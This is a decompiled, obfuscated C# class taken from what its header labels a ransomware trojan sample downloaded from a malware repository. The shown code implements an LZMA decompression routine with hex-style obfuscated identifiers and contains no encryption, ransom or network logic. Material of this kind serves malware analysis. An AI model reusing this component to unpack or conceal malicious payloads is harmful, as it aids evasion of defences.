// Decompiled with JetBrains decompiler
// Type: 4960759E
// Assembly: Ftqhdpj, Version=1.3.3.7, Culture=neutral, PublicKeyToken=null
// MVID: C158A460-57F8-457A-0BCE-962A6D11CC24
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.04\HEUR-Trojan-Ransom.MSIL.Blocker.gen-450fe551f9989c51ae6b8ad556b22c4f34076f1cc61d2ffdfab5c55522d6e210.exe

using System;
using System.IO;

public class \u0034960759E
{
  private readonly \u0034960759E.\u0031DA52FC8 \u0033E1539BA;
  private readonly \u00360482DD4[] \u0037ADE31A8;
  private readonly \u00339602DDB[] \u0031B547E24;
  private readonly \u0031A07540F \u003586A5AE3;
  private readonly \u0034FF62C1D \u003134D0F80;
  private readonly \u00360482DD4[] \u0033BC160E3;
  private uint \u0030E781EB8;
  private uint \u003132D35A0;
  private readonly \u0034960759E.\u0034D6F2C0C \u0034085340D;
  private readonly \u00360482DD4[] \u0031C025EE9;
  private readonly \u00360482DD4[] \u0031E921C70;
  private readonly \u00360482DD4[] \u0032A766EED;
  private uint \u00305A04630;
  private readonly \u00360482DD4[] \u00323B36600;
  private \u00339602DDB \u003254850D6;
  private readonly \u0034960759E.\u0034D6F2C0C \u0035E2B619C;
  private readonly \u00360482DD4[] \u00302AA544E;
  private uint \u0035C2C3CA6;

  private void \u00351F3422E(int _param1, int _param2)
  {
    if (_param1 > 8)
      throw new ArgumentException("lp > 8");
    if (_param2 > 8)
      throw new ArgumentException("lc > 8");
    this.\u0033E1539BA.\u0030CC72E2E(_param1, _param2);
  }

  public void \u00306D64944(Stream _param1, Stream _param2, long _param3)
  {
    this.\u00361E3542A(_param1, _param2);
    \u00365356C21.\u0033A371E12 obj = new \u00365356C21.\u0033A371E12();
    obj.\u003236D2AAD();
    uint num1 = 0;
    uint num2 = 0;
    uint num3 = 0;
    uint num4 = 0;
    ulong num5 = 0;
    ulong num6 = (ulong) _param3;
    if (num5 < num6)
    {
      if (this.\u0037ADE31A8[(int) obj.\u00339323BFA << 4].\u00360190E1E(this.\u003134D0F80) != 0U)
        throw new InvalidDataException("IsMatchDecoders");
      obj.\u0034A2B75B7();
      this.\u003586A5AE3.\u003037C4828(this.\u0033E1539BA.\u0031FCE3F33(this.\u003134D0F80, 0U, (byte) 0));
      ++num5;
    }
    while (num5 < num6)
    {
      uint num7 = (uint) num5 & this.\u003132D35A0;
      if (this.\u0037ADE31A8[((int) obj.\u00339323BFA << 4) + (int) num7].\u00360190E1E(this.\u003134D0F80) == 0U)
      {
        byte num8 = this.\u003586A5AE3.\u00362291F72(0U);
        this.\u003586A5AE3.\u003037C4828(obj.\u00351770726() ? this.\u0033E1539BA.\u0031FCE3F33(this.\u003134D0F80, (uint) num5, num8) : this.\u0033E1539BA.\u0035F735D51(this.\u003134D0F80, (uint) num5, num8, this.\u003586A5AE3.\u00362291F72(num1)));
        obj.\u0034A2B75B7();
        ++num5;
      }
      else
      {
        uint num9;
        if (this.\u00323B36600[(int) obj.\u00339323BFA].\u00360190E1E(this.\u003134D0F80) == 1U)
        {
          if (this.\u00302AA544E[(int) obj.\u00339323BFA].\u00360190E1E(this.\u003134D0F80) == 0U)
          {
            if (this.\u0033BC160E3[((int) obj.\u00339323BFA << 4) + (int) num7].\u00360190E1E(this.\u003134D0F80) == 0U)
            {
              obj.\u0033B9015D0();
              this.\u003586A5AE3.\u003037C4828(this.\u003586A5AE3.\u00362291F72(num1));
              ++num5;
              continue;
            }
          }
          else
          {
            uint num10;
            if (this.\u0032A766EED[(int) obj.\u00339323BFA].\u00360190E1E(this.\u003134D0F80) == 0U)
            {
              num10 = num2;
            }
            else
            {
              if (this.\u0031C025EE9[(int) obj.\u00339323BFA].\u00360190E1E(this.\u003134D0F80) == 0U)
              {
                num10 = num3;
              }
              else
              {
                num10 = num4;
                num4 = num3;
              }
              num3 = num2;
            }
            num2 = num1;
            num1 = num10;
          }
          num9 = this.\u0034085340D.\u00312846787(this.\u003134D0F80, num7) + 2U;
          obj.\u0033EA519F4();
        }
        else
        {
          num4 = num3;
          num3 = num2;
          num2 = num1;
          num9 = 2U + this.\u0035E2B619C.\u00312846787(this.\u003134D0F80, num7);
          obj.\u00320532B3F();
          uint num11 = this.\u0031B547E24[(int) \u00365356C21.\u003694F2044(num9)].\u00373CE1548(this.\u003134D0F80);
          if (num11 >= 4U)
          {
            int num12 = (int) (num11 >> 1) - 1;
            uint num13 = (uint) ((2 | (int) num11 & 1) << num12);
            num1 = num11 >= 14U ? num13 + (this.\u003134D0F80.\u0030FD84A40(num12 - 4) << 4) + this.\u003254850D6.\u003026B33CD(this.\u003134D0F80) : num13 + \u00339602DDB.\u0035779074C(this.\u0031E921C70, (uint) ((int) num13 - (int) num11 - 1), this.\u003134D0F80, num12);
          }
          else
            num1 = num11;
        }
        if ((ulong) num1 >= (ulong) this.\u003586A5AE3.\u00333986CF3 + num5 || num1 >= this.\u00305A04630)
        {
          if (num1 != uint.MaxValue)
            throw new InvalidDataException("rep0");
          break;
        }
        this.\u003586A5AE3.\u0037B326135(num1, num9);
        num5 += (ulong) num9;
      }
    }
    this.\u003586A5AE3.\u0033E4E7B4E();
    this.\u003586A5AE3.\u0037FA7718C();
    this.\u003134D0F80.\u0035B1B71C1();
  }

  private void \u0031F7C1837(int _param1)
  {
    if (_param1 > 4)
      throw new ArgumentException("pb > Base.KNumPosStatesBitsMax");
    uint num = (uint) (1 << _param1);
    this.\u0035E2B619C.\u00367CC2104(num);
    this.\u0034085340D.\u00367CC2104(num);
    this.\u003132D35A0 = num - 1U;
  }

  private void \u003000C45EC(uint _param1)
  {
    if ((int) this.\u0030E781EB8 == (int) _param1)
      return;
    this.\u0030E781EB8 = _param1;
    this.\u00305A04630 = Math.Max(this.\u0030E781EB8, 1U);
    this.\u003586A5AE3.\u003537201F4(Math.Max(this.\u00305A04630, 4096U));
  }

  private void \u00361E3542A(Stream _param1, Stream _param2)
  {
    this.\u003134D0F80.\u00375E1663F(_param1);
    this.\u003586A5AE3.\u0036FB40D88(_param2, false);
    for (uint index1 = 0; index1 < 12U; ++index1)
    {
      for (uint index2 = 0; index2 <= this.\u003132D35A0; ++index2)
      {
        uint index3 = (index1 << 4) + index2;
        this.\u0037ADE31A8[(int) index3].\u0037C072A56();
        this.\u0033BC160E3[(int) index3].\u0037C072A56();
      }
      this.\u00323B36600[(int) index1].\u0037C072A56();
      this.\u00302AA544E[(int) index1].\u0037C072A56();
      this.\u0032A766EED[(int) index1].\u0037C072A56();
      this.\u0031C025EE9[(int) index1].\u0037C072A56();
    }
    this.\u0033E1539BA.\u00311E81C81();
    for (uint index = 0; index < 4U; ++index)
      this.\u0031B547E24[(int) index].\u0032B062DBF();
    for (uint index = 0; index < 114U; ++index)
      this.\u0031E921C70[(int) index].\u0037C072A56();
    this.\u0035E2B619C.\u0033F742E7A();
    this.\u0034085340D.\u0033F742E7A();
    this.\u003254850D6.\u0032B062DBF();
  }

  public void \u0033E0344DB(byte[] _param1)
  {
    if (_param1.Length < 5)
      throw new ArgumentException("properties.Length < 5");
    int num1 = (int) _param1[0] % 9;
    int num2 = (int) _param1[0] / 9;
    int num3 = num2 % 5;
    int num4 = num2 / 5;
    if (num4 > 4)
      throw new ArgumentException("pb > Base.kNumPosStatesBitsMax");
    uint num5 = 0;
    for (int index = 0; index < 4; ++index)
      num5 += (uint) _param1[1 + index] << index * 8;
    this.\u003000C45EC(num5);
    this.\u00351F3422E(num3, num1);
    this.\u0031F7C1837(num4);
  }

  public \u0034960759E()
  {
    this.\u003586A5AE3 = new \u0031A07540F();
    this.\u003134D0F80 = new \u0034FF62C1D();
    this.\u0037ADE31A8 = new \u00360482DD4[192];
    this.\u00323B36600 = new \u00360482DD4[12];
    this.\u00302AA544E = new \u00360482DD4[12];
    this.\u0032A766EED = new \u00360482DD4[12];
    this.\u0031C025EE9 = new \u00360482DD4[12];
    this.\u0033BC160E3 = new \u00360482DD4[192];
    this.\u0031B547E24 = new \u00339602DDB[4];
    this.\u0031E921C70 = new \u00360482DD4[114];
    this.\u003254850D6 = new \u00339602DDB(4);
    this.\u0035E2B619C = new \u0034960759E.\u0034D6F2C0C();
    this.\u0034085340D = new \u0034960759E.\u0034D6F2C0C();
    this.\u0033E1539BA = new \u0034960759E.\u0031DA52FC8();
    // ISSUE: explicit constructor call
    base.\u002Ector();
    this.\u0030E781EB8 = uint.MaxValue;
    for (int index = 0; index < 4; ++index)
      this.\u0031B547E24[index] = new \u00339602DDB(6);
  }

  private class \u0034D6F2C0C
  {
    private \u00339602DDB \u0030B7C6357;
    private readonly \u00339602DDB[] \u0035ED62095;
    private uint \u003464E3D33;
    private \u00360482DD4 \u003658535FC;
    private readonly \u00339602DDB[] \u00357043098;
    private \u00360482DD4 \u0035209769A;

    public void \u0033F742E7A()
    {
      this.\u0035209769A.\u0037C072A56();
      for (uint index = 0; index < this.\u003464E3D33; ++index)
      {
        this.\u0035ED62095[(int) index].\u0032B062DBF();
        this.\u00357043098[(int) index].\u0032B062DBF();
      }
      this.\u003658535FC.\u0037C072A56();
      this.\u0030B7C6357.\u0032B062DBF();
    }

    public \u0034D6F2C0C()
    {
      this.\u0030B7C6357 = new \u00339602DDB(8);
      // ISSUE: explicit constructor call
      base.\u002Ector();
    }

    public uint \u00312846787(\u0034FF62C1D _param1, uint _param2)
    {
      if (this.\u0035209769A.\u00360190E1E(_param1) == 0U)
        return this.\u0035ED62095[(int) _param2].\u00373CE1548(_param1);
      uint num = 8;
      return this.\u003658535FC.\u00360190E1E(_param1) != 0U ? num + 8U + this.\u0030B7C6357.\u00373CE1548(_param1) : num + this.\u00357043098[(int) _param2].\u00373CE1548(_param1);
    }

    public void \u00367CC2104(uint _param1)
    {
      for (uint index = this.\u003464E3D33; index < _param1; ++index)
      {
        this.\u0035ED62095[(int) index] = new \u00339602DDB(3);
        this.\u00357043098[(int) index] = new \u00339602DDB(3);
      }
      this.\u003464E3D33 = _param1;
    }
  }

  private class \u0031DA52FC8
  {
    private int \u00373E869F1;
    private uint \u003712C45E7;
    private int \u00355245912;
    private \u0034960759E.\u0031DA52FC8.\u00346F379BA[] \u0036A8507E9;
    private uint \u0037E3624D6 = 1;

    public byte \u0035F735D51(\u0034FF62C1D _param1, uint _param2, byte _param3, byte _param4) => this.\u0036A8507E9[(int) this.\u0032AC64039(_param2, _param3)].\u0037E77058C(_param1, _param4);

    public void \u00311E81C81()
    {
      uint num = (uint) (1 << this.\u00373E869F1 + this.\u00355245912);
      for (uint index = 0; index < num; ++index)
        this.\u0036A8507E9[(int) index].\u0032BFC2E0E();
    }

    private uint \u0032AC64039(uint _param1, byte _param2) => (uint) ((((int) _param1 & (int) this.\u003712C45E7) << this.\u00373E869F1) + ((int) _param2 >> 8 - this.\u00373E869F1));

    public byte \u0031FCE3F33(\u0034FF62C1D _param1, uint _param2, byte _param3) => this.\u0036A8507E9[(int) this.\u0032AC64039(_param2, _param3)].\u0030E6425B2(_param1);

    public void \u0030CC72E2E(int _param1, int _param2)
    {
      if (this.\u0036A8507E9 != null && this.\u00373E869F1 == _param2 && this.\u00355245912 == _param1)
        return;
      this.\u00355245912 = _param1;
      this.\u003712C45E7 = (uint) ((1 << _param1) - 1);
      this.\u00373E869F1 = _param2;
      uint length = (uint) (1 << this.\u00373E869F1 + this.\u00355245912);
      this.\u0036A8507E9 = new \u0034960759E.\u0031DA52FC8.\u00346F379BA[(int) length];
      for (uint index = 0; index < length; ++index)
        this.\u0036A8507E9[(int) index].\u00333045CCA();
    }

    private struct \u00346F379BA
    {
      private \u00360482DD4[] \u0033CBB3169;

      public byte \u0037E77058C(\u0034FF62C1D _param1, byte _param2)
      {
        uint index = 1;
        do
        {
          uint num1 = (uint) ((int) _param2 >> 7 & 1);
          _param2 <<= 1;
          uint num2 = this.\u0033CBB3169[(1 + (int) num1 << 8) + (int) index].\u00360190E1E(_param1);
          index = index << 1 | num2;
          if ((int) num1 != (int) num2)
          {
            while (index < 256U)
              index = index << 1 | this.\u0033CBB3169[(int) index].\u00360190E1E(_param1);
            break;
          }
        }
        while (index < 256U);
        return (byte) index;
      }

      public void \u0032BFC2E0E()
      {
        for (int index = 0; index < 768; ++index)
          this.\u0033CBB3169[index].\u0037C072A56();
      }

      public byte \u0030E6425B2(\u0034FF62C1D _param1)
      {
        uint index = 1;
        do
        {
          index = index << 1 | this.\u0033CBB3169[(int) index].\u00360190E1E(_param1);
        }
        while (index < 256U);
        return (byte) index;
      }

      public void \u00333045CCA() => this.\u0033CBB3169 = new \u00360482DD4[768];
    }
  }
}
